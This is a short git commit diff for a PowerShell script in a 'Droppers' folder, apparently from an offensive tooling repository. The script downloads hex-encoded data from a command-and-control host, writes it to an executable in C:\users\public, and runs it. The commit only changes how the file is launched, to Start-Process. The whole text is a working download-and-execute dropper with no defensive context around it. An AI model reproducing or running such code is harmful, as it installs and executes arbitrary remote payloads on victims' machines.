ec836792a2be73586022d14fd59c40c88e7a1091
matt-culbert <culbertmatt@gmail.com>
2022-05-27 13:04:41 -0400

    Update dropper.ps1

--- Droppers/dropper.ps1
+++ Droppers/dropper.ps1
@@ -1,3 +1,3 @@
 invoke-restmethod 'http://c2.culbertreport.com:8000' | Tee-Object -Variable hex
 [System.IO.File]::WriteAllBytes('C:\users\public\tmp.exe', ($hex -split '(.{2})' -ne '' -replace '^', '0X')) 
-./C:\users\public\tmp.exe
+Start-Process -FilePath “C:\users\public\tmp.exe”
